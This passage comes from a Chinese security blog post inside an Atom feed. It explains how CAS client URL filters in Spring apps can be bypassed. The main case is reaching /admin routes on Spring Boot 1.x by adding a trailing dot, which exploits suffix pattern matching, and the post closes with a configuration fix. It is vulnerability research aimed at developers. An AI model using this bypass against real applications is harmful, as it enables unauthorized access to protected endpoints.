class="name">param-name</span>&gt;</span>ignorePattern<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>^/api/guest$<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br></pre></td></tr></table></figure><p>个人认为这个可以算洞（没处理…/而且contains这种选项就不应该存在），也可以甩锅给开发没仔细看文档。</p><h2 id="bypass-trick2-useSuffixPatternMatch">bypass trick2 useSuffixPatternMatch</h2><h3 id="场景-2">场景</h3><p>这里假设/admin系列的路由都不允许访问。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> today.redteam.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMethod;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AdminController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(</span></span><br><span class="line"><span class="meta">            value = &#123;&quot;/admin&quot;&#125;,</span></span><br><span class="line"><span class="meta">            method = &#123;RequestMethod.GET&#125;</span></span><br><span class="line"><span class="meta">    )</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">admin</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello admin&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(</span></span><br><span class="line"><span class="meta">            value = &#123;&quot;/admin/api&quot;&#125;,</span></span><br><span class="line"><span class="meta">            method = &#123;RequestMethod.GET&#125;</span></span><br><span class="line"><span class="meta">    )</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">admin1</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello admin1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一次开发认真看了文档做了以下配置。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> today.redteam.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> net.unicon.cas.client.configuration.CasClientConfigurerAdapter;</span><br><span class="line"><span class="keyword">import</span> net.unicon.cas.client.configuration.EnableCasClient;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.web.servlet.FilterRegistrationBean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> today.redteam.aop.CasAspect;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableCasClient</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CasConfig</span> <span class="keyword">extends</span> <span class="title class_">CasClientConfigurerAdapter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CasConfig</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">configureAuthenticationFilter</span><span class="params">(FilterRegistrationBean authenticationFilter)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.configureAuthenticationFilter(authenticationFilter);</span><br><span class="line">        authenticationFilter.addUrlPatterns(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/admin/*&quot;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;cas.serverUrlPrefix&quot;</span>, <span class="string">&quot;https://cashost.com/cas&quot;</span>);</span><br><span class="line">        System.setProperty(<span class="string">&quot;cas.serverLoginUrl&quot;</span>, <span class="string">&quot;https://cashost.com/cas/login&quot;</span>);</span><br><span class="line">        System.setProperty(<span class="string">&quot;cas.clientHostUrl&quot;</span>, <span class="string">&quot;http://localhost:8888/&quot;</span>);</span><br><span class="line">        System.setProperty(<span class="string">&quot;cas.validationType&quot;</span>, <span class="string">&quot;CAS&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>/admin这个路由看起来似乎也没有什么问题。</p><p><img src="20210510110128-03982a3c-b13c-1.png" alt="image.png"></p><p>常规的绕过方式也不起作用<br><img src="20210510110137-08f100da-b13c-1.png" alt="image.png"></p><p><img src="20210510110143-0cb5c50c-b13c-1.png" alt="image.png"></p><h3 id="利用-2">利用</h3><p>但在低版本的springboot上还是能绕过（本地环境是1.5.9.RELEASE）。</p><p><img src="20210510110208-1bc8fab4-b13c-1.png" alt="image.png"></p><h3 id="原理-2">原理</h3><p>原理是在springboot 1.x中useSuffixPatternMatch默认为true，springboot会对路由进行正则匹配。</p><p>断点下在org.springframework.web.servlet.mvc.condition.PatternsRequestCondition#getMatchingPattern。</p><p><img src="20210510110222-23f07f6e-b13c-1.png" alt="image.png"></p><p>/admin.*自然能匹配上/admin.也就绕过了。</p><h3 id="修复-2">修复</h3><p>如下关闭setUseSuffixPatternMatch或升级到2.x</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> today.redteam.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.ComponentScan;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.HandlerMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.EnableWebMvc;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ComponentScan</span></span><br><span class="line"><span class="meta">@EnableWebMvc</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AppConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> HandlerMapping <span class="title function_">requestMappingHandlerMapping</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">RequestMappingHandlerMapping</span> <span class="variable">mapping</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMappingHandlerMapping</span>();</span><br><span class="line">        mapping.setUseSuffixPatternMatch(<span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">return</span> mapping;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">cas client 用于限制匿名用户对某些特定api的访问，在一些特殊的环境下可能会有权限绕过问题。下面分享两个实际生活中遇到的案例。</summary>
    
    
    
    <category term="web security" scheme="https://cl0und.xyz/categories/web-security/"/>
    
    
    <category term="java" scheme="https://cl0und.xyz/tags/java/"/>
    
  </entry>
  
</feed>
